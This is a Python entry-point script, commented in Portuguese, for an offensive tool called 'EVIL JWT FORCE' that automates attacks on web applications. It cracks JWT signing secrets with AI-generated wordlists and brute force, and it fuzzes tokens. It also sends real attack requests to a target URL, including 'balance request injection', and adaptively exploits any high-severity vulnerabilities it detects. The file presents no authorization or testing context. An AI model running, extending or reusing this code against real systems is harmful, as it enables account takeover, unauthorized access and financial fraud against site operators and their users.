import os
import sys

# Adiciona o diretório raiz do projeto ao sys.path
current_dir = os.path.dirname(os.path.abspath(__file__))
project_root = os.path.dirname(current_dir) # Isso sobe um nível de 'ai_system' para 'EVIL_JWT_FORCE'
sys.path.insert(0, project_root)

import threading
import time
import subprocess
import json
import argparse
import numpy as np
from datetime import datetime
from loguru import logger
from typing import Any, Dict, List, Optional

# Configuração de logs
os.makedirs("ai_system/logs", exist_ok=True)
logger.add("ai_system/logs/main_log_{time}.log", rotation="500 MB", level="INFO")
logger.add("ai_system/logs/main_error_{time}.log", rotation="500 MB", level="ERROR")

# Importações para módulos de ataque
try:
    from modules.jwt_tools_integrator import JWTToolsIntegrator
    from modules.token_bruteforce import TokenBruteforcer
    from modules.fuzz_jwt import JWTFuzzer
    from modules.scan_target import TargetScanner
except ImportError as e:
    logger.error(f"Erro ao importar módulos de ataque: {str(e)}")

# Importar o AIEngine diretamente
try:
    from ai_system.engine import AIEngine
    from ai_module.jwt_predictor import JWTPredictor
    from ai_module.adaptive_fuzzer import AdaptiveFuzzer
    from ai_system.context_analyzer import ContextAnalyzer
    from ai_system.strategy_selector import StrategySelector
    HAS_ATTACK_MODULES = True
except ImportError as e:
    logger.error(f"Erro ao importar módulos de IA: {str(e)}")
    HAS_ATTACK_MODULES = False

# Função para verificar a validade de um token
def is_token_valid(token):
    parts = token.split('.')
    return len(parts) == 3

# Função para analisar e atacar um token real
def analyze_and_attack_token(token, wordlist=None, output_file=None, verbose=False):
    logger.info(f"Iniciando análise e ataque ao token JWT: {token[:20]}...")
    
    if not is_token_valid(token):
        logger.error("Token JWT inválido!")
        return {"error": "Token JWT inválido!"}
    
    results = {}
    
    try:
        # 1. Análise com AIEngine
        print("[1/6] Analisando token com AI Engine...")
        engine = AIEngine()
        analysis = engine.analyze_token(token)
        results["analysis"] = analysis
        
        if verbose:
            print(f"Análise do token: {json.dumps(analysis, indent=2)}")
        
        # 2. Análise contextual avançada
        print("[2/6] Realizando análise contextual avançada...")
        context_analyzer = ContextAnalyzer()
        context_analysis = context_analyzer.analyze_token_context(token, analysis)
        results["context_analysis"] = context_analysis
        
        if verbose:
            print(f"Análise contextual: {json.dumps(context_analysis, indent=2)}")
        
        # 3. Predição de segredos potenciais
        print("[3/6] Gerando palavras-chave potenciais para o segredo...")
        predictor = JWTPredictor()
        
        # Usar informações do token para melhorar predições
        target_info = {}
        if "payload" in analysis and analysis["payload"]:
            for field in ["iss", "aud", "sub", "client_id"]:
                if field in analysis["payload"]:
                    target_info[field] = analysis["payload"][field]
        
        # Adicionar informações contextuais
        if "issuer_domain" in context_analysis:
            target_info["domain"] = context_analysis["issuer_domain"]
        if "application_type" in context_analysis:
            target_info["application"] = context_analysis["application_type"]
        
        predictor.set_target_info(target_info)
        # Deep AI recommendations (chain-of-thought)
        try:
            print("[3.5/6] Gerando recomendações aprofundadas de ataque com raciocínio aprofundado...")
            recommendations = engine.get_attack_recommendations(token, target_info)
            results["deep_recommendations"] = recommendations
            if verbose:
                print(f"Recomendações detalhadas da IA: {json.dumps(recommendations, indent=2)}")
        except Exception as e:
            logger.error(f"Erro ao gerar recomendações aprofundadas: {str(e)}")
            results["deep_recommendations"] = {"error": str(e)}

        # Gerar wordlist potencial
        try:
            potential_secrets = predictor.generate_wordlist(token, max_words=1000)
            results["potential_secrets"] = potential_secrets[:20]
        except Exception as e:
            logger.error(f"Erro ao gerar wordlist: {str(e)}")
            results["potential_secrets"] = []
            potential_secrets = []
        
        # Salvar lista completa em arquivo
        wordlist_file = "data/ai_generated_wordlist.txt"
        with open(wordlist_file, "w") as f:
            f.write("\n".join(potential_secrets))
        
        print(f"Lista de {len(potential_secrets)} segredos potenciais salva em: {wordlist_file}")
        
        # 4. Fuzzing adaptativo
        try:
            print("[4/6] Gerando mutações adaptativas do token...")
            fuzzer = AdaptiveFuzzer()
            # Usar informações contextuais para melhorar o fuzzing
            target_context = {
                "token_type": context_analysis.get("token_usage", "unknown"),
                "issuer_type": context_analysis.get("issuer_type", "unknown"),
                "application_type": context_analysis.get("application_type", "unknown")
            }
            mutations = fuzzer.generate_adaptive_mutations(token, target_context, limit=20)
            results["mutations"] = mutations
            if verbose:
                print(f"Geradas {len(mutations)} mutações adaptativas.")
                for i, mut in enumerate(mutations[:5]):
                    print(f"Mutação #{i+1}: {mut.get('strategy')} - {mut.get('token')[:30]}...")
        except Exception as e:
            logger.error(f"Erro no fuzzing adaptativo: {str(e)}")
            results["mutations"] = []
        
        # 5. Seleção de estratégia de ataque
        try:
            print("[5/6] Selecionando estratégia de ataque otimizada...")
            strategy_selector = StrategySelector()
            attack_strategy = strategy_selector.select_optimal_strategy(analysis, context_analysis)
            results["attack_strategy"] = attack_strategy
            if verbose:
                print(f"Estratégia de ataque: {json.dumps(attack_strategy, indent=2)}")
        except Exception as e:
            logger.error(f"Erro na seleção de estratégia: {str(e)}")
            results["attack_strategy"] = {}
        
        # 6. Integração com ferramentas JWT
        try:
            print("[6/6] Integrando com ferramentas JWT externas...")
            integrator = JWTToolsIntegrator(token=token)
            if wordlist:
                integrator.set_wordlist(wordlist)
            else:
                integrator.set_wordlist(wordlist_file)
            tool_results = integrator.run_all_tools()
            combined_results = integrator.get_combined_results()
            results["tools_results"] = combined_results
            if verbose:
                print(f"Resultados combinados: {json.dumps(combined_results, indent=2)}")
        except Exception as e:
            logger.error(f"Erro na integração com ferramentas externas: {str(e)}")
            results["tools_results"] = {}
        
        # Ataque de força bruta usando TokenBruteforcer
        try:
            if results.get("attack_strategy", {}).get("should_bruteforce", True):
                print("[+] Iniciando ataque de força bruta...")
            bruteforcer = TokenBruteforcer(token)
            print("Executando força bruta por 60 segundos...")
            bruteforce_result = bruteforcer.bruteforce_with_timeout(
                wordlist_file=wordlist_file if not wordlist else wordlist,
                timeout=60
            )
            results["bruteforce_result"] = bruteforce_result
            if bruteforce_result.get("success"):
                print(f"[SUCESSO] Segredo encontrado: {bruteforce_result.get('secret')}")
            else:
                print("[INFO] Não foi possível encontrar o segredo no tempo limite.")
        except Exception as e:
            logger.error(f"Erro no ataque de força bruta: {str(e)}")
            results["bruteforce_result"] = {"error": str(e)}
        
        # Final narrative summary using chain-of-thought
        try:
            print("[7/6] Gerando narrativa detalhada do processo com raciocínio natural...")
            narrative = engine._chain_of_thought({
                "analysis": analysis,
                "context_analysis": context_analysis,
                "attack_strategy": attack_strategy,
                "potential_secrets": potential_secrets
            }, results)
            results["narrative"] = narrative
            if verbose:
                print(f"Narrativa detalhada: {narrative}")
        except Exception as e:
            logger.error(f"Erro ao gerar narrativa detalhada: {str(e)}")
        
        return results
        
    except Exception as e:
        logger.error(f"Erro durante análise e ataque: {str(e)}")
        results["error"] = str(e)
        return results

# Função para analisar um site alvo
def analyze_target_site(url, output_file=None, verbose=False):
    logger.info(f"Iniciando análise do site alvo: {url}")
    
    results = {}
    
    try:
        # 1. Escanear o alvo
        print("[1/4] Escaneando o alvo...")
        scanner = TargetScanner(url)
        scan_results = scanner.scan()
        results["scan"] = scan_results
        
        if verbose:
            print(f"Resultados do scan: {json.dumps(scan_results, indent=2)}")
        
        # 2. Análise contextual do alvo
        print("[2/4] Analisando contexto do alvo...")
        context_analyzer = ContextAnalyzer()
        context = context_analyzer.analyze_target_context(scan_results)
        results["context"] = context
        
        if verbose:
            print(f"Análise de contexto: {json.dumps(context, indent=2)}")
        
        # 3. Verificar se o site usa JWT
        if scan_results.get("uses_jwt", False):
            print("[3/4] Site usa JWT. Extraindo token de exemplo...")
            token = scan_results.get("jwt_token", "")
            
            if token:
                # Analisar o token encontrado
                print("[4/4] Analisando token encontrado...")
                token_results = analyze_and_attack_token(token, output_file=None, verbose=verbose)
                results["token_analysis"] = token_results
            else:
                print("[4/4] Nenhum token JWT encontrado para análise.")
                results["token_analysis"] = {"error": "Nenhum token JWT encontrado"}
        else:
            print("[3-4/4] Site não usa JWT. Pulando análise de token.")
            results["token_analysis"] = {"error": "Site não usa JWT"}
        
        # Salvar resultados em arquivo se solicitado
        if output_file:
            with open(output_file, "w") as f:
                json.dump(results, f, indent=2)
            print(f"Resultados salvos em: {output_file}")
        
        return results
        
    except Exception as e:
        logger.error(f"Erro durante análise do site: {str(e)}")
        results["error"] = str(e)
        return results

def initiate_attack_from_url(url: str, output_file: Optional[str] = None, verbose: bool = False) -> Dict[str, Any]:
    """
    Inicia uma sequência completa de ataque a partir de uma URL fornecida.
    Esta função orquestra o escaneamento, análise e estratégias de ataque adaptativas com requisições reais.
    
    Args:
        url: A URL do alvo para atacar
        output_file: Arquivo opcional para salvar os resultados
        verbose: Se deve exibir saída detalhada
    
    Returns:
        Dicionário contendo os resultados da sequência de ataque
    """
    logger.info(f"Iniciando sequência de ataque na URL: {url}")
    results = {
        'url': url,
        'timestamp': datetime.now().isoformat(),
        'scan_results': {},
        'context_analysis': {},
        'vulnerabilities': [],
        'attack_attempts': [],
        'successful_injections': []
    }
    
    try:
        # Passo 1: Escanear o alvo
        scanner = TargetScanner()
        scan_results = scanner.scan_target(url)
        results['scan_results'] = scan_results
        if verbose:
            print(f"[SCAN] Escaneamento do alvo concluído: {json.dumps(scan_results, indent=2)}")
        
        # Passo 2: Analisar contexto
        analyzer = ContextAnalyzer()
        analyzer.set_target(url)
        target_data = {
            'url': url,
            'headers': scan_results.get('headers', {}),
            'response_codes': scan_results.get('response_codes', []),
            'technologies': scan_results.get('technologies', []),
            'uses_jwt': scan_results.get('uses_jwt', False),
            'shows_detailed_errors': scan_results.get('shows_errors', False),
            'allows_header_injection': scan_results.get('allows_header_injection', False)
        }
        context_analysis = analyzer.analyze_target_context(target_data)
        results['context_analysis'] = context_analysis
        if verbose:
            print(f"[CONTEXT] Análise de contexto: {json.dumps(context_analysis, indent=2)}")
        
        # Passo 3: Identificar vulnerabilidades
        vulnerabilities = analyzer.identify_potential_vulnerabilities(target_data)
        results['vulnerabilities'] = vulnerabilities
        if verbose:
            print(f"[VULNERABILITIES] Vulnerabilidades potenciais: {json.dumps(vulnerabilities, indent=2)}")
        
        # Passo 4: Inicializar AI Engine para análise de token se JWT for usado
        if context_analysis.get('uses_jwt', False):
            engine = AIEngine()
            tokens = scan_results.get('jwt_tokens', [])
            for token in tokens:
                token_analysis = engine.analyze_token(token)
                recommendations = engine.get_attack_recommendations(token, target_data)
                results['attack_attempts'].append({
                    'token': token[:20] + '...',
                    'analysis': token_analysis,
                    'recommendations': recommendations
                })
                if verbose:
                    print(f"[TOKEN ATTACK] Token: {token[:20]}... Recomendações: {json.dumps(recommendations, indent=2)}")
        
        # Passo 5: Ataque adaptativo com fuzzer para injeção de requisição de saldo
        fuzzer = AdaptiveFuzzer()
        selector = StrategySelector()
        strategies = selector.select_strategies({
            'target_context': context_analysis,
            'vulnerabilities': vulnerabilities,
            'scan_data': scan_results
        })
        for strategy in strategies:
            if 'balance' in strategy.get('target', '').lower() or 'request' in strategy.get('target', '').lower():
                mutations = fuzzer.generate_mutations_for_strategy(strategy, limit=10)
                for mutation in mutations:
                    # Enviar requisição real ao alvo
                    attack_result = fuzzer.send_attack_request(url, mutation, strategy)
                    results['attack_attempts'].append(attack_result)
                    if attack_result.get('response', {}).get('status_code') == 200 and 'success' in attack_result.get('response', {}).get('body', '').lower():
                        results['successful_injections'].append(attack_result)
                    if verbose:
                        print(f"[ATTACK] Tentativa com {strategy['strategy']}: {json.dumps(attack_result, indent=2)}")
        
        # Passo 6: Exploração contínua para vulnerabilidades críticas
        for vuln in vulnerabilities:
            if vuln['severity'] in ['high', 'critical']:
                exploration_results = explore_vulnerability(url, vuln, fuzzer, verbose)
                results['attack_attempts'].extend(exploration_results)
        
        # Escrever resultados em arquivo se especificado
        if output_file:
            with open(output_file, 'w') as f:
                json.dump(results, f, indent=2)
                if verbose:
                    print(f"[OUTPUT] Resultados salvos em {output_file}")
        
        logger.info(f"Sequência de ataque concluída para {url}")
        return results
    except Exception as e:
        logger.error(f"Erro durante sequência de ataque em {url}: {str(e)}")
        results['error'] = str(e)
        return results

def explore_vulnerability(url: str, vulnerability: Dict[str, Any], fuzzer: 'AdaptiveFuzzer', verbose: bool = False) -> List[Dict[str, Any]]:
    """
    Explora continuamente uma vulnerabilidade específica para encontrar métodos de exploração bem-sucedidos com requisições reais.

    Args:
        url: URL do alvo
        vulnerability: Dicionário contendo detalhes da vulnerabilidade
        fuzzer: Instância de AdaptiveFuzzer para gerar mutações
        verbose: Se deve exibir saída detalhada

    Returns:
        Lista de resultados de tentativas de ataque
    """
    logger.info(f"Explorando vulnerabilidade {vulnerability['type']} em {url}")
    results = []

    try:
        # Gerar mutações direcionadas para esta vulnerabilidade
        mutations = fuzzer.generate_targeted_mutations(vulnerability, limit=20)
        for mutation in mutations:
            # Enviar ataque real ao alvo
            attack_result = fuzzer.send_attack_request(url, mutation, {'strategy': vulnerability['type']})
            results.append(attack_result)
            if verbose:
                print(f"[EXPLORE] Tentativa em {vulnerability['type']}: {json.dumps(attack_result, indent=2)}")

        # Loop de aprendizado adaptativo com base em respostas reais
        for i in range(3):
            if any(r.get('response', {}).get('status_code') == 200 for r in results):
                break
            if verbose:
                print(f"[ADAPT] Iteração {i+1}: Ajustando estratégia para {vulnerability['type']}")
            mutations = fuzzer.generate_mutations_with_learning(results, limit=10)
            for mutation in mutations:
                attack_result = fuzzer.send_attack_request(url, mutation, {'strategy': vulnerability['type']})
                results.append(attack_result)
                if verbose:
                    print(f"[EXPLORE ADAPT] Tentativa adaptativa em {vulnerability['type']}: {json.dumps(attack_result, indent=2)}")

        logger.info(f"Exploração concluída de {vulnerability['type']} em {url}")
        return results
    except Exception as e:
        logger.error(f"Erro ao explorar vulnerabilidade {vulnerability['type']} em {url}: {str(e)}")
        return [{'error': str(e)}]

# Função principal
def main():
    parser = argparse.ArgumentParser(description="EVIL JWT FORCE - Sistema de Ataque a JWT baseado em IA")
    parser.add_argument("--token", type=str, help="Token JWT para análise e ataque")
    parser.add_argument("--wordlist", type=str, help="Arquivo de wordlist para ataque de força bruta")
    parser.add_argument("--output", type=str, help="Arquivo para salvar os resultados")
    parser.add_argument("--verbose", action="store_true", help="Ativa saída detalhada")
    parser.add_argument("--url", type=str, help="URL do alvo para análise e ataque")
    parser.add_argument("--chat", action="store_true", help="Iniciar chat interativo no terminal com pensamento profundo")
    args = parser.parse_args()
    
    # Se nenhum token ou URL for passado, inicia chat integrado
    if not args.token and not args.url:
        from ai_system.chat_tui import ChatApp
        ChatApp().run()
        return
    if args.url:
        print(f"[INFO] Iniciando ataque à URL: {args.url}")
        results = initiate_attack_from_url(args.url, args.output, args.verbose)
        print(f"[RESULTADOS] Ataque concluído: {json.dumps(results, indent=2)}")
    elif args.token:
        print(f"[INFO] Analisando e atacando token: {args.token[:20]}...")
        results = analyze_and_attack_token(args.token, args.wordlist, args.output, args.verbose)
        print(f"[RESULTADOS] {json.dumps(results, indent=2)}")
    # Se chegar aqui, significa que não ocorreu análise; encerramos normalmente

if __name__ == "__main__":
        main() 